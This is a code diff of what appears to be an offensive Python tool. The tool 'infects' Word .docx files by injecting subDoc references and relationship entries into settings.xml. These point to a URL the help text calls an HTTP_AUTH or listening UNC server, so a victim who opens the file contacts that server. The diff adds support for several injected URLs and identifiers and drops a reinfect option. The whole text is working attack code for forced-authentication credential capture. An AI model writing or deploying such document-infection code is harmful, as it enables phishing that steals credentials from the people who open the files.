@@ -163,37 +163,25 @@ def analyzedoc(infile):
 
     return False
 
-def infectDoc(goodocx, badocx, url, identifier, reinfect=False):
+def infectDoc(goodocx, badocx, url, identifier):
     tempdir = tempfile.mkdtemp()
     temp_zip_path = os.path.join(tempdir, 'temp.docx')
     shutil.copy(goodocx, badocx)
-    orig_identifier = identifier
-    if reinfect:
-        with ZipFile(badocx) as arc:
-            with arc.open('word/settings.xml') as fr:
-                docx = fr.read()
-            oldid = docx.split('r:id=')[1].split('"')[1]
-            print("[*] Replacing old ID ({}) with rId{}".format(oldid, identifier))
-            settingsxml = docx.replace(oldid, "rId{}".format(identifier))
-    else:
-        with ZipFile(badocx) as arc:
-            with arc.open('word/settings.xml') as fr:
-                docx = fr.read()
-            closepos = docx.index('/>')+2
-            prepos = docx[:closepos]
-            editpos = ""
-            for i in url:
-                editpos += '<w:p><w:subDoc r:id="rId{}"/></w:p>'.format(identifier)
-                identifier += 1
-            postpos = docx[closepos+2:]
-            settingsxml = "{}{}{}".format(prepos, editpos, postpos)
+    with ZipFile(badocx) as arc:
+        with arc.open('word/settings.xml') as fr:
+            docx = fr.read()
+        closepos = docx.index('/>')+2
+        prepos = docx[:closepos]
+        editpos = ""
+        for i in identifier:
+            editpos += '<w:p><w:subDoc r:id="rId{}"/></w:p>'.format(i)
+        postpos = docx[closepos+2:]
+        settingsxml = "{}{}{}".format(prepos, editpos, postpos)
     with UpdateableZipFile(badocx, "a") as inj:
         inj.writestr("word/settings.xml", settingsxml)
         tmp = ""
-        identifier = orig_identifier
-        for i in url:
-            tmp += SETRELS.format(identifier, i)
-            identifier += 1
+        for i in range(0, len(identifier)):
+            tmp += SETRELS.format(identifier[i], url[i])
         inj.writestr("word/_rels/settings.xml.rels", SETRELS_HEADER + tmp + SETRELS_FOOTER)
     print("[*] {} has been injected and output is: {}".format(goodocx, badocx))
 
@@ -208,7 +196,7 @@ def main():
         parser.add_argument('-i', '--infile', help='docx File to inject')
         parser.add_argument('-o', '--outfile', help='Filename of the file post injection')
         parser.add_argument('-u', '--url', action='append', help='Domain pointed to HTTP_AUTH server. e.g. https://domain.com/docs/target-UUID')
-        parser.add_argument('-d', '--identifier', help='Document identifier', default=100)
+        parser.add_argument('-d', '--identifier', action='append', help='Document identifier', default=[])
 
         # Parse arguments
         try:
@@ -227,8 +215,21 @@ def main():
                 print("[!] Please specify listening UNC path via -u|--url")
                 raise SystemExit
 
+            if len(args.identifier) == 0:
+                args.identifier = [100]
+            else:
+                for i in range(0, len(args.identifier)):
+                    args.identifier[i] = int(args.identifier[i])
+
+            if len(args.identifier) != len(args.url):
+                args.identifier = [args.identifier[0]]
+                for i in range(1, len(args.url)):
+                    args.identifier.append(args.identifier[i-1]+1)
+
             print("[+] Infecting {}".format(args.infile))
-            infectDoc(args.infile, args.outfile, args.url, args.identifier, False)
+            for i in range(0, len(args.url)):
+                print "[+] rId:%d -> %s" % (args.identifier[i], args.url[i])
+            infectDoc(args.infile, args.outfile, args.url, args.identifier)
 
     except(KeyboardInterrupt):
         print("[!!] Program was interrupted (ctrl+c). Exiting...")
